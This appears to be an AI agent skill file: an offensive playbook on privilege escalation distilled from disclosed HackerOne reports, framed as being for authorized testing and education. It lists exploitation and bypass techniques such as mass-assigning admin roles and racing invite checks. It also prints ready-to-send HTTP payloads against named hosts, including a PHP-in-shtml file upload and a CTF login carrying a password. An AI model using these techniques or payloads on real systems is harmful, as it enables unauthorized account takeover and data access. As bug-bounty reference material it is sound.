---
name: privilege-escalation
description: "Privilege Escalation offensive playbook from 157 disclosed HackerOne reports (26 critical, 46 high, 55 medium, 30 low). Use when hunting or reviewing privilege escalation. Triggers: privilege, takeover, escalation, subdomain, allowed."
license: "For authorized security testing and education only."
---

# Privilege Escalation

> Distilled from **157** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

A lower-privileged principal gains higher privileges  -  role tampering, mass-assignment of `is_admin`, insecure defaults, or reaching functions gated only in the UI.

## Where to hunt

- Diff the requests an admin makes vs. a normal user; try the admin requests with a low-priv session.
- Inspect role/permission fields in profile-update and invite flows for mass-assignment (`role`, `is_admin`, `scopes`).
- Look at invitation, SSO, and team-membership flows where a role is assigned from client input.

## Exploitation playbook

- Add `role=admin`/`is_staff=true` to update requests the server blindly binds to the model.
- Accept an invite then tamper with the embedded role/tenant before it is persisted.
- Abuse a self-service endpoint (API token creation, scope grant) to mint higher scopes than the UI allows.

## Bypass techniques

- Send role fields the UI never shows; the backend may still honor them.
- Race the assignment (accept invite + change role) so the check and the write disagree.

## Impact & escalation

- Admin role → read all tenant data, impersonate users, disable logging, pivot to infra.

## Remediation

- Whitelist bindable fields; derive privileges server-side; re-check authorization at the sink, not the entry point.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#412481](https://hackerone.com/reports/412481)  -  China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability
*high*

```http
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Content-Length: 234
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06

------WebKitFormBoundaryevPInYidBxSvSd06
Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"
Content-Type: text/html

<?php echo 1111;>
------WebKitFormBoundaryevPInYidBxSvSd06--
```

### 2. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Projec…
*low*

```http
POST /pin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ████████
Referer: https://mozilla-pontoon-staging.herokuapp.com/eu/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16
Origin: https://mozilla-pontoon-staging.herokuapp.com

comment_id=25725
```

### 3. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Projec…
*low*

```http
POST /unpin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ███
Referer: https://mozilla-pontoon-staging.herokuapp.com/eu/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16
Origin: https://mozilla-pontoon-staging.herokuapp.com

comment_id=25725
```

### 4. [#412481](https://hackerone.com/reports/412481)  -  China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability
*high*

```http
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Content-Length: 234
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06

------WebKitFormBoundaryevPInYidBxSvSd06
```

### 5. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collabo…
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 100
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=70fc6bcd3409b8acaec02992d31b4d03&challenge_answer=xxxxxxxx
```

### 6. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collabo…
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 100
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

More payloads: see [payloads.md](payloads.md) (97 curated).

## Recurring patterns in this dataset

Most frequent terms across the 157 reports (term (count)): `privilege` (51), `takeover` (48), `escalation` (47), `subdomain` (47), `allowed` (43), `access` (40), `attacker` (34), `permission` (32), `privileges` (26), `domain` (24), `discovered` (23), `arbitrary` (22), `code` (22), `admin` (21), `permissions` (18), `shopify` (17), `potentially` (16), `execution` (16)

## Worked example  -  [report #689314](https://hackerone.com/reports/689314)

*Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests* (critical, $12,000)

> I've found a three minor vulnerabilities which, when combined, allow an attacker to copy private repositories, confidential issues, private snippets, and then some. I'll go through the code path to explain the vulnerabilities and how they are combined. See the Proof of Concept section if you want to reproduce it immediately. Let's start at the ProjectsController of EE, which is prepended to app/controllers/projects controller.rb in an EE instance. ee/app/controllers/ee/projects controller.rb This method defines what parameters can be passed by the user. The two notable parameters here are use custom template and group with project templates id. This method appends the result value of project…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#689314](https://hackerone.com/reports/689314) | critical | $12,000 | gitlab | Project Template functionality can be used to copy private project data, such as reposi… |
| [#852613](https://hackerone.com/reports/852613) | critical | $10,000 | elastic | Remote Code Execution on Cloud via latest Kibana 7.6.2 |
| [#861744](https://hackerone.com/reports/861744) | critical | $5,000 | elastic | Remote Code Execution in coming Kibana 7.7.0 |
| [#697055](https://hackerone.com/reports/697055) | critical | $2,000 | semmle | Worker container escape lead to arbitrary file reading in host machine [again] |
| [#694181](https://hackerone.com/reports/694181) | critical | $2,000 | semmle | Worker container escape lead to arbitrary file reading in host machine |
| [#791775](https://hackerone.com/reports/791775) | critical |  -  | shopify | Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalati… |
| [#796808](https://hackerone.com/reports/796808) | critical |  -  | shopify | [Part II] Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privileg… |
| [#910300](https://hackerone.com/reports/910300) | critical |  -  | shopify | Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation |

*See [reference.md](reference.md) for all 157 reports in this class.*
